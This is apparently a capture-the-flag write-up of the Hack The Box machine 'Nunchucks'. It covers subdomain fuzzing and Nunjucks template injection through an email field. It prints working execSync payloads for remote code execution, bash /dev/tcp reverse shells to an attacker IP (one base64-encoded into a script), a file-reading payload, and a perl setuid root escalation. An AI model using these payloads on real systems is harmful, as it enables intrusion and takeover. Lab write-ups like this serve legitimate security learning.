1. Run Nmap to discover any open ports and services from the web server.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3b7b1e08-e98c-4497-9520-1f112bb70c54)

2. Try to open the ip address on the browser and get a domain nunchuks.htb. Add to **/etc/hosts/** so I can open the website.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/2004824b-ce1f-4e81-b032-03b5694d6474)

Website:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d4f64624-14ea-43cd-882b-7cdaaa998424)

3. Checking the Sign Up and Log In feature and can't use both of them.
Signup:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/85432824-3fef-4900-92b1-8b8eed99f263)

Login:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d2ddddb7-8d36-46b5-96d0-c720828e2f84)

4. Checking another website features and contents. In the footer, I found that there is a store feature to be opened coming soon.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/2977a9df-af8d-4698-bc24-d9f76fafe823)

5. So I thought that there is a hidden subdomain from the website. To check it, I use this command `wfuzz -u https://nunchucks.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -H "Host: FUZZ.nunchucks.htb"`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/4f8cd75a-ca63-49c0-8cff-550ce3fb036e)

6. Hmm, it seems the characters has average of 30587. To get the unique one (the subdomain that we want to find) we can filter it with `--hh` in our command `wfuzz -u https://nunchucks.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -H "Host: FUZZ.nunchucks.htb" --hh 30587`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/28f5989e-71b7-4257-9394-780f84b122f0)

7. I add it to **/etc/hosts** that give me the access to open the subdomain.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e60ce229-8654-42f6-bcdc-6797d84481f0)

Website:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/37f1e264-4386-4eeb-bb4e-a72f5faf3b16)

8. It seems that the website only receive email inputs.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/270df8d4-f4d2-4757-b912-e22fabf99f97)

9. First thing is SQLi, so I put ' in front of my dummy email and it seems fine without error.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/10ffb2b8-4c6b-4829-b01f-5e96c6dbb527)

10. Next thing is SSTI, try to input `{{6*8}}@gmail.com` and yes it shows 48 as the result.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/36edf8ba-8383-4cb2-86db-b08aa8e204f3)

11. Searching for a payload that related to "nunchucks" and found this amazing [payload](https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml).

Payload:
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('insert any bash command')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/f3db7daf-cf4c-4761-a941-849ba8a5cd67)

12. I try to execute reverse shell attack with this [tool](https://www.revshells.com/) and it didn't work.

payload:<br>
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/10.10.14.20/777 0>&1"')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/bbe97c82-70a3-433d-90cd-2084bedeed2a)

13. Knowing that the execSync function can execute a bash command. So I search the user.txt location and found in /home/david/user.txt. 

Payload: <br>
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /home/david/user.txt')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/425014a2-35de-46ff-996e-afb60f374550)

14. Again, I try to execute reverse shell and got an idea to insert it to the david terminal. First, we can encode it to base64 and send it with execSync function.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1fab502a-8d7b-44eb-bf45-018bab675c40)

Payload:
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC83NzcgMD4mMQo= | base64 -d > /home/david/payload.sh')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/0251335b-6203-4b99-b504-b6e2b677ce0a)

Check:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/346a8d55-47e0-4946-b135-c902735d1b7d)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/778f5dd5-384a-4892-909a-78ab6fd35ec1)

15. Now I can execute it with adding bash infront of payload.sh command. 

Payload: <br>
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash ~/payload.sh')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6d8354fd-304e-4a1e-81d2-759249212bc6)

Host:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/8818ce95-fbbf-4c19-b656-1a28599721e5)

16. I successfully get the david terminal. Next I check the directories and discover a backup file in .pl extension (perl).
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/42fc94ce-8421-4285-a47c-32ae4b69d5a0)

17. Open the file and I found that the POSIX qw(setuid) must be 0 to use the root privilege.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/35736c03-14e3-437d-8e3a-1e195ee01e2e)

18. To change it, I use the payload from this [web](https://gtfobins.github.io/gtfobins/perl/#capabilities). 

Payload:
`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/9e7e5996-ca7a-46a7-bfa6-c8cccb2feb87)

19. It doesn't work, so I write the payload to the new perl file with echo.

Command:<br>
`echo '#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";' > root.pl`<br>

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/05c7b034-7aab-4506-ae20-7a13e9f1a04c)

20. Give execute permission to the file.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d65db7ba-066e-434b-9423-40489e487a8a)

22. Run the payload and we get the root privilege. The root flag can be found in /root/root.txt.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/dc418505-95f3-4189-9d53-02b84c690307)






















